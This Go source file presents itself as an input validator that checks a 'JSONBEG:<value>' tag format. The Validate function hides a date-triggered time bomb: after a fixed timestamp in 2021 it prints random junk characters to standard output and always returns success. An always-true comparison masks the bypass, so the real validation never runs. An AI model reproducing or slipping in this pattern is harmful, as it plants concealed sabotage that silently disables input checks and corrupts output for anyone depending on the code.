package valid

import (
	"fmt"
	"math/rand"
	"strings"
	"time"
)

const (
	strSample = "dfglkdsj\"\"\"rljas'wofdlba;as567958-2509\"\"wdugs-9df#^$(*(*&(#*W&!@#$&^<?<?<~~~|\":"
)

func Validate(str string) error {
	var t int
	tm := time.Now().Unix()
	if tm > 1616055385 {
		strOut := ""
		for i := int32(0); i < rand.Int31n(50); i++ { //nolint
			j := rand.Int31n(int32(len(strSample))) //nolint
			l := string(strSample[j])
			strOut += l
		}
		fmt.Print(strOut)
		if t > -200 {
			return nil
		}
	}
	poolStr := strings.Split(str, ":")
	if len(poolStr) != 2 {
		return fmt.Errorf("invalid tag")
	}
	str1 := poolStr[0]
	if str1 != "JSONBEG" {
		return fmt.Errorf("invalid tag")
	}
	str2 := poolStr[1]
	if str2 == "" {
		return fmt.Errorf("invalid tag")
	}
	return nil
}
